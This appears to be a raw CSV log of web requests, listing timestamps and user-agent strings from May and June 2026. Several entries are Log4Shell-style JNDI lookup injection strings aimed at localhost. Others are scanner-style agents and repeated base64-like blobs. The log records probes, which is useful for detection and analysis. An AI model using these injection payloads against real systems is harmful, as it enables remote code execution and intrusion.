Time,User Agent
"2026-05-30 11:30:53","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:32:44","${jndi:rmi://127.0.0.1/exploit}"
"2026-06-01 15:31:45","${jndi:dns://127.0.0.1/x}"
"2026-06-01 10:44:29","${jndi:dns://127.0.0.1/x}"
"2026-05-31 19:41:36","${jndi:rmi://127.0.0.1/exploit}"
"2026-05-31 19:41:24","${jndi:dns://127.0.0.1/x}"
"2026-05-30 12:26:52","${jndi:dns://127.0.0.1/x}"
"2026-06-12 20:19:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 20:19:43","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-12 16:25:07","TelemetryCollector/9.7 @@@@@@@"
"2026-06-03 10:46:31","VulnerabilitySweep/2.6 @@@@@@@"
"2026-06-01 15:32:24","TelemetryCollector/9.7 @@@@@@@"
"2026-06-16 11:59:13","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:43","TelemetryCollector/9.7 @@@@@@@"
"2026-06-14 14:04:34","ThreatHunterAgent/8.2 @@@@@@@"
"2026-06-13 11:36:22","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-13 11:36:21","NetworkSurveyBot/3.9 @@@@@@@"
"2026-06-12 23:38:28","TelemetryCollector/9.7 @@@@@@@"
"2026-06-12 22:09:43","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 20:19:42","InternalAuditScanner/4.0 @@@@@@@"
"2026-06-12 16:25:08","SecurityAssessmentClient/3.1 @@@@@@@"
"2026-06-12 16:25:08","WebEnumerationFramework/11.0 @@@@@@@"
"2026-06-12 16:25:08","AssetProfiler/6.5 @@@@@@@"
"2026-06-09 15:36:44","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:32:07","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:27:23","*BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA=, *BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcPAAAAAAAAAAAA="
"2026-06-09 15:10:11","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:06:12","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 15:02:31","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA=, *BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
"2026-06-09 14:59:04","*BcfBAAAAokCAAEFBAAAZhU2VahgQRn7aueKqDVwUAGivsPJAV6gBAIAAKAA="
